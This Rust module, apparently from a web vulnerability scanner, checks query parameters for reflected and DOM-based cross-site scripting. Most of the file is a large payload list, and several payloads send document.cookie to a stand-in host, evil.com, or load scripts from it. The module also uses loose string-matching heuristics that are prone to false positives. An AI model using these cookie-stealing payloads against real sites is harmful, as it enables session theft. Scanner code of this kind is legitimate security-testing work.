//! Cross-Site Scripting (XSS) detection — reflected, DOM-based, mutation, CSR bypass.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use url::Url;

const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "<script>document.write('XSS')</script>",
    "<script>new Image().src='//evil.com/log?c='+document.cookie</script>",
    "<script src=//evil.com/xss.js></script>",
    "<script src=//evil.com/x.js></script>",
    "<script type=text/javascript>alert(1)</script>",
    "<script language=javascript>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<sCrIpT>alert(1)</sCrIpT>",
    "<script%00>alert(1)</script>",
    "<script>alert(1)",
    "</script><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "</script><svg onload=alert(1)>",
    "</textarea><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "</noscript><script>alert(1)</script>",
    "</select><script>alert(1)</script>",
    "</option><script>alert(1)</script>",
    "<script>eval('alert(1)')</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',1)</script>",
    "<script>window['alert'](1)</script>",
    "<script>self['alert'](1)</script>",
    "<script>top['alert'](1)</script>",
    "<script>parent['alert'](1)</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<script>location='javascript:alert(1)'</script>",
    "<script>location.href='javascript:alert(1)'</script>",
    "<script>document.location='javascript:alert(1)'</script>",
    "<script>import('data:text/javascript,alert(1)')</script>",
    "<script type=module>alert(1)</script>",
    "<script async src=//evil.com/xss.js></script>",
    "<script defer src=//evil.com/xss.js></script>",
    "<script src=https://evil.com/xss.js></script>",
    "<script src='//evil.com/xss.js'></script>",
    "<script src=\"//evil.com/xss.js\"></script>",
    "<script>window['a'+'lert'](1)</script>",
    "<script>eval.call(window,'alert(1)')</script>",
    "<script>(function(){alert(1)})()</script>",
    "<script>(()=>alert(1))()</script>",
    "<script>alert(1)//</script>",
    "<script>alert(1);</script>",
    "<script src=data:text/javascript,alert(1)></script>",
    "<script src=data:;base64,YWxlcnQoMSk=></script>",
    "<script src=\"data:text/javascript;base64,YWxlcnQoMSk=\"></script>",
    "<script>onerror=alert;throw 1</script>",
    "<script>\\u0061lert(1)</script>",
    "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
    "<script>document.write(\"<svg onload=alert(1)>\")</script>",
    "<script>document.write(atob('PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'))</script>",
    "<script>fetch('//evil.com/?c='+document.cookie)</script>",
    "<script>navigator.sendBeacon('//evil.com/?c='+document.cookie)</script>",
    "<script>window.open('//evil.com/?c='+document.cookie)</script>",
    "<script>top.location='//evil.com/?c='+document.cookie</script>",
    "<script>document.location='//evil.com/?c='+document.cookie</script>",
    "<script>new Image().src='//evil.com/?'+encodeURIComponent(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<img src=x onerror=prompt(1)>",
    "<img src=x onerror=confirm(1)>",
    "<img src=x onerror=eval('alert(1)')>",
    "<img src=x onerror=alert(1)//>",
    "<img src=x onerror=alert(1);>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<img src=x: onerror=alert(1)>",
    "<img src=javascript:alert(1)>",
    "<img src=1 onerror=\"alert(1)\">",
    "<img/src=x onerror=alert(1)>",
    "<img%20src=x%20onerror=alert(1)>",
    "<img src='x' onerror='alert(1)'>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<img src=x onerror=top['alert'](1)>",
    "<img src=x onerror=self['alert'](1)>",
    "<img src=x onerror=window['alert'](1)>",
    "<img src=x onerror=parent['alert'](1)>",
    "<img src=x onerror=document.location='https://evil.com/?c='+document.cookie>",
    "<img src=x onerror=document.body.innerHTML='<svg onload=alert(1)>'>",
    "<img SRC=x onerror=alert(1)>",
    "<IMG SRC=x ONERROR=alert(1)>",
    "<img src=x onerror=new Function('alert(1)')()>",
    "<img src=x onerror=Function('alert(1)')()>",
    "<img src=x onerror=setTimeout('alert(1)')>",
    "<img src=x onerror=eval.call(window,'alert(1)')>",
    "<img src=x onerror=import('data:text/javascript,alert(1)')>",
    "<img src=x onerror=fetch('//evil.com/?c='+document.cookie)>",
    "<img src=x onerror=open('//evil.com/?c='+document.cookie)>",
    "<img src=x onerror=navigator.sendBeacon('//evil.com/?c='+document.cookie)>",
    "<img src=x onerror=alert(1) id=x>",
    "<img src=x onerror=alert(1)//<svg onload=alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    "<img/src=x/onerror=alert(1)//x>",
    "<img src=x/onerror=alert(1)>",
    "<img src=x\t onerror=alert(1)>",
    "<img\n src=x onerror=alert(1)>",
    "<img\r src=x onerror=alert(1)>",
    "<img src=x\tonerror=alert(1)>",
    "<img%00src=x%00onerror=alert(1)>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<img src=x onerror=alert(1)",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=x onerror=alert(location.href)>",
    "<img src=x onerror=(1,alert)(1)>",
    "<img src=x onerror=alert.call(null,1)>",
    "<img src=x onerror=alert.apply(null,[1])>",
    "<img src=x onerror=Reflect.apply(alert,null,[1])>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(document.domain)>",
    "<svg onload=prompt(1)>",
    "<svg onload=confirm(1)>",
    "<svg onload=eval('alert(1)')>",
    "<svg onload=eval(atob('YWxlcnQoMSk='))>",
    "<svg onanimationend=alert(1)>",
    "<svg onbegin=alert(1)>",
    "<svg onload=alert(1) xmlns=http://www.w3.org/2000/svg>",
    "<svg><set attributeName=onload value=alert(1)></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
    "<svg><animateTransform onbegin=alert(1) attributeName=transform></svg>",
    "<svg><handler onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><script href=//evil.com/xss.js></script></svg>",
    "<svg><script xlink:href=//evil.com/xss.js></script></svg>",
    "<svg onload=alert(1)//<img src=x>",
    "<svg xmlns=http://www.w3.org/2000/svg onload=alert(1)>",
    "<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>",
    "<svg onload=alert(1)",
    "<svg/onload=alert(1)//<p>",
    "<svg/onload=alert(1)//<i>",
    "<svg><g/onload=alert(1)//<p>",
    "<svg onload=alert(1)//<x>",
    "<svg><animate attributeName=href values=javascript:alert(1)><a><text x=0 y=10>Click</text></a></animate></svg>",
    "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=100 height=100/></a></svg>",
    "<svg><script>\\u0061lert(1)</script></svg>",
    "<video onerror=alert(1)><source src=x>",
    "<audio onerror=alert(1)><source src=x>",
    "<video><source onerror=alert(1)>",
    "<audio><source onerror=alert(1)>",
    "<video autoplay onerror=alert(1)><source src=x>",
    "<audio autoplay onerror=alert(1)><source src=x>",
    "<video autoplay controls onerror=alert(1)><source src=x>",
    "<object onerror=alert(1) data=x>",
    "<object data=x onerror=alert(1)>",
    "<object type=text/html data=x onerror=alert(1)>",
    "<embed onerror=alert(1) src=x>",
    "<embed src=x onerror=alert(1)>",
    "<embed src=\"data:text/html,<script>alert(1)</script>\">",
    "<applet onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<details open ontoggle=alert(1)//<img src=x>",
    "<details ontoggle=alert(1) open>",
    "<details%0aopen%0aontoggle=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onafterprint=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<input autofocus onfocusin=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<form autofocus onfocus=alert(1)>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<form method=post action=javascript:alert(1)><input type=submit>",
    "<form action=# onsubmit=alert(1)><input type=submit>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<iframe src=x onload=alert(1)>",
    "<iframe src=javascript:alert(1)//<img src=x>",
    "<iframe src=vbscript:msgbox(1)>",
    "<button autofocus onfocus=alert(1)>",
    "<button onfocus=alert(1) autofocus>",
    "<menuitem oncommand=alert(1)>",
    "<input type=image src=x onerror=alert(1)>",
    "<input type=file onfocus=alert(1) autofocus>",
    "<input type=text onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<marquee loop=1 onfinish=alert(1)>",
    "<p onmouseover=alert(1)>x</p>",
    "<p onmousedown=alert(1)>x</p>",
    "<p onmouseup=alert(1)>x</p>",
    "<p onclick=alert(1)>x</p>",
    "<p ondblclick=alert(1)>x</p>",
    "<p onauxclick=alert(1)>x</p>",
    "<p ontouchstart=alert(1)>x</p>",
    "<p onpointerdown=alert(1)>x</p>",
    "<a href=\"javascript:alert(1)\">click</a>",
    "<a href=javascript:alert(1)>click</a>",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "javascript:alert(1)//",
    "javascript:alert(document.cookie)",
    "javascript:alert(document.domain)",
    "javascript:confirm(1)",
    "javascript:prompt(1)",
    "javascript:eval('alert(1)')",
    "javascript:fetch('//evil.com/?c='+document.cookie)",
    "javas\tcript:alert(1)",
    "vbscript:msgbox(1)",
    "<a href=jav&#x61;script:alert(1)>x</a>",
    "<a href=javascript&#x3A;alert(1)>x</a>",
    "javascript&#58;alert(1)",
    "<a href=\" javascript:alert(1)\">x</a>",
    "<base href=javascript:alert(1)//>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<link rel=preload href=javascript:alert(1)>",
    "<table background=javascript:alert(1)>",
    "<td background=javascript:alert(1)>",
    "<div background=javascript:alert(1)>",
    "<isindex action=javascript:alert(1)>",
    "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
    "<meta http-equiv=refresh content='0;url=data:text/html,<script>alert(1)</script>'>",
    "<style>@import 'http://evil.com/xss.css';</style>",
    "<style>@import \"http://evil.com/xss.css\";</style>",
    "<style>@import url(//evil.com/xss.css);</style>",
    "<style>@import '//evil.com/xss.css';</style>",
    "<style>body{background:url('javascript:alert(1)')}</style>",
    "<div style=\"background:url('javascript:alert(1)')\">",
    "<div style=width:expression(alert(1))>",
    "<div style=\"width:expression(alert(1))\">",
    "<img style=x:expression(alert(1))>",
    "<xss style=behavior:url(xss.htc)>",
    "<style>@media screen{body{content:url(//evil.com/log)}}</style>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;alert(1)&#x3c;/script&#x3e;",
    "&#x3C;img src=x onerror=alert(1)&#x3E;",
    "&#x3C;svg onload=alert(1)&#x3E;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
    "<iframe srcdoc=&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;>",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\"><svg onload=alert(1)>",
    "'><svg onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "\";alert(1);//",
    "';alert(1);//",
    "\\';alert(1);//",
    "</textarea><svg onload=alert(1)>",
    "</title><img src=x onerror=alert(1)>",
    "</plaintext><script>alert(1)</script>",
    "</xmp><script>alert(1)</script>",
    "</iframe><script>alert(1)</script>",
    "--><script>alert(1)</script>",
    "<!--><script>alert(1)</script>-->",
    "</template><svg onload=alert(1)>",
    "\" autofocus onfocus=alert(1) x=\"",
    "' autofocus onfocus=alert(1) x='",
    "x\" onerror=alert(1) autofocus x=\"",
    "\" onmouseover=alert(1) x=\"",
    "\" onload=alert(1) x=\"",
    "' onerror=alert(1) autofocus x='",
    "\" onfocus=alert(1) autofocus x=\"",
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",
    "{{$on.constructor('alert(1)')()}}",
    "{{'a'.constructor.constructor('alert(1)')()}}",
    "<ng-app><script>alert(1)</script></ng-app>",
    "<<script>alert(1)</script>",
    "<<script>alert(1)></script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>al<ert(1)</script>",
    "<svg><script>alert(1)<script>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<math><mi xlink:href=javascript:alert(1)>X</mi></math>",
    "<math><annotation-xml encoding=text/html><script>alert(1)</script></annotation-xml></math>",
    "<math><mtext/onload=alert(1)//<p>",
    "<xml><script>alert(1)</script></xml>",
    "<div onscroll=alert(1) style=overflow:auto;height:50px;width:50px tabindex=0>x</div>",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "<script\u{2215}>alert(1)</script\u{2215}>",
    "<img src=x onerror=alert(1)\u{2215}>",
    "<svg onload=alert(1)\u{2044}>",
    "<img src=x onerror=alert(1)\u{2044}>",
    "<script\u{ff0f}>alert(1)</script\u{ff0f}>",
    "<details open ontoggle=alert(1)\u{2215}>",
    "<script>\u{ff08}alert(1)\u{ff09}</script>",
    "<script>alert\u{ff08}1\u{ff09}</script>",
    "<svg onload=alert(1)\u{ff0f}>",
    "<j\u{430}vascript:alert(1)>",
    "j\u{430}vascript:alert(1)",
    "<svg\u{a0}onload=alert(1)>",
    "<img\u{a0}src=x\u{a0}onerror=alert(1)>",
];

const XSS_ENCODED_VARIANTS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;svg onload=alert(1)&#x3E;",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "<script>\\u0061lert(1)</script>",
    "<img src=x onerror=&#x61;lert(1)>",
    "<img src=x onerror=&#97;lert(1)>",
    "<svg onload=&#x61;lert(1)>",
    "&#x3C;img src=x onerror=alert(1)&#x3E;",
    "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
    "<iframe srcdoc=&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;>",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "javascript&#58;alert(1)",
    "<details open ontoggle=&#x61;lert(1)>",
    "<img src=x%00onerror=alert(1)>",
    "<svg/onload=%26%23x61%3Blert(1)>",
];

fn is_xss_reflected(body: &str, payload: &str) -> bool {
    if body.contains(payload) {
        return true;
    }
    if let Ok(url_decoded) = urlencoding::decode(payload)
        && body.contains(&url_decoded.into_owned())
    {
        return true;
    }
    let patterns = [
        "<script>alert(",
        "<img src=x onerror=",
        "<svg onload=",
        "onerror=alert(",
        "onload=alert(",
        "onfocus=alert(",
        "ontoggle=alert(",
        "onanimationend=alert(",
        "onbegin=alert(",
        "javascript:alert(",
        "eval(atob(",
        "srcdoc=",
        "<svg",
    ];
    for pat in &patterns {
        if body.contains(pat) && !payload.contains(pat) {
            return true;
        }
    }
    false
}

pub async fn check_xss(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect::<Vec<_>>();

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _original_value) in &base_query {
        for payload in XSS_PAYLOADS {
            let test_url = {
                let mut u = url.clone();
                {
                    let mut pairs = u.query_pairs_mut();
                    pairs.clear();
                    for (k, v) in &base_query {
                        let val = if k == param_name {
                            payload.to_string()
                        } else {
                            v.clone()
                        };
                        pairs.append_pair(k, &val);
                    }
                }
                u
            };

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
                && is_xss_reflected(&response.body, payload)
            {
                let mut f = Finding::new(
                    format!("Reflected XSS detected in parameter '{}'", param_name),
                    AssetRef {
                        identifier: url.to_string(),
                        kind: "web".into(),
                    },
                    Severity::High,
                    Confidence::Confirmed,
                    "grym-web-scanner",
                );
                f.categories.push("A03:2025-Injection".into());
                f.cwe_ids.push(79);
                f.evidence.push(Evidence::redacted(
                    "xss-reflection",
                    format!("Payload reflected: {}", payload),
                    response.body.chars().take(200).collect::<String>(),
                ));
                f.remediation =
                    "Escape all user input before rendering. Implement Content-Security-Policy \
                         headers."
                        .into();
                f.references
                    .push("https://owasp.org/www-community/attacks/xss/".into());
                findings.push(f);
                break;
            }
        }

        if findings.iter().all(|f| !f.title.contains(param_name)) {
            for payload in XSS_ENCODED_VARIANTS {
                let test_url = {
                    let mut u = url.clone();
                    {
                        let mut pairs = u.query_pairs_mut();
                        pairs.clear();
                        for (k, v) in &base_query {
                            let val = if k == param_name {
                                payload.to_string()
                            } else {
                                v.clone()
                            };
                            pairs.append_pair(k, &val);
                        }
                    }
                    u
                };

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    && is_xss_reflected(&response.body, payload)
                {
                    let mut f = Finding::new(
                        format!("Encoded XSS reflection in parameter '{}'", param_name),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::High,
                        Confidence::Likely,
                        "grym-web-scanner",
                    );
                    f.categories.push("A03:2025-Injection".into());
                    f.cwe_ids.push(79);
                    f.evidence.push(Evidence::redacted(
                        "xss-encoded",
                        format!("Encoded payload bypassed WAF: {}", payload),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation =
                        "Apply context-aware output encoding at all rendering layers.".into();
                    f.references.push(
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                                .into(),
                        );
                    findings.push(f);
                    break;
                }
            }
        }
    }

    Ok(findings)
}

pub fn check_dom_xss_indicators(body: &str, url: &Url) -> Vec<Finding> {
    let mut findings = Vec::new();
    let dom_sinks = [
        "innerHTML",
        "outerHTML",
        "document.write",
        "insertAdjacentHTML",
        "location.href",
        "location.replace",
        "location.assign",
        "location=",
        "eval(",
        "setTimeout(",
        "setInterval(",
        "Function(",
        "srcdoc",
        ".html(",
        "document.domain",
        "postMessage",
    ];
    let query = url.query().unwrap_or("");
    if query.contains("document")
        || query.contains("location")
        || query.contains("eval")
        || query.contains("callback")
        || query.contains("redirect")
        || query.contains("url")
        || dom_sinks.iter().any(|s| body.contains(s))
    {
        let mut f = Finding::new(
            "DOM-based XSS indicator in URL parameters".to_string(),
            AssetRef {
                identifier: url.to_string(),
                kind: "web".into(),
            },
            Severity::Medium,
            Confidence::Possible,
            "grym-web-scanner",
        );
        f.categories.push("A03:2025-Injection".into());
        f.cwe_ids.push(79);
        findings.push(f);
    }
    findings
}
